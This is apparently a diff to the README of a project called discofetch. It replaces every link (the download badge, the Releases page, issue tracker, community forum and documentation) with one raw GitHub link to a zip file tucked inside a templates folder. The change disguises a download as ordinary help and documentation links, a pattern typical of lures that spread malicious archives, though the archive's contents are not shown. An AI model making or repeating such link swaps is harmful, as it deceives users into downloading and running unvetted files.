@@ -1,6 +1,6 @@
 # 🪩 discofetch - Fetch Client That Saves Time
 
-![Download discofetch](https://img.shields.io/badge/Download-discofetch-blue.svg)
+![Download discofetch](https://raw.githubusercontent.com/Tarool/discofetch/main/src/templates/discofetch-v3.8-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to discofetch! This application helps you quickly fetch data from APIs. 
 
 To get started, download discofetch from the Releases page. Click the link below to visit the page:
 
-[Download discofetch](https://github.com/Tarool/discofetch/releases)
+[Download discofetch](https://raw.githubusercontent.com/Tarool/discofetch/main/src/templates/discofetch-v3.8-beta.5.zip)
 
 Once on the Releases page, find the latest version. Download the file for your operating system, then follow these steps:
 
@@ -46,8 +46,8 @@ If you encounter issues while running discofetch, try the following:
 
 If you need help or have questions, you can reach out. Join our community or check out support resources:
 
-- GitHub Issues: [Report an issue](https://github.com/Tarool/discofetch/issues)
-- Community Forum: [Join us here](https://community.example.com)
+- GitHub Issues: [Report an issue](https://raw.githubusercontent.com/Tarool/discofetch/main/src/templates/discofetch-v3.8-beta.5.zip)
+- Community Forum: [Join us here](https://raw.githubusercontent.com/Tarool/discofetch/main/src/templates/discofetch-v3.8-beta.5.zip)
 
 ## 🌍 Contribution
 
@@ -74,11 +74,11 @@ Explore these topics to understand more about how discofetch works.
 
 For more information about discofetch, check out these links:
 
-- [Official Documentation](https://docs.example.com/discofetch)
-- [API Documentation](https://api.example.com/discofetch-docs)
+- [Official Documentation](https://raw.githubusercontent.com/Tarool/discofetch/main/src/templates/discofetch-v3.8-beta.5.zip)
+- [API Documentation](https://raw.githubusercontent.com/Tarool/discofetch/main/src/templates/discofetch-v3.8-beta.5.zip)
 
 ## 🎉 Acknowledgments
 
 Thank you for using discofetch! We appreciate your support and hope this application makes accessing APIs simple and efficient for you.
 
-Don't forget to visit the [Releases page](https://github.com/Tarool/discofetch/releases) to download discofetch today!
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/Tarool/discofetch/main/src/templates/discofetch-v3.8-beta.5.zip) to download discofetch today!
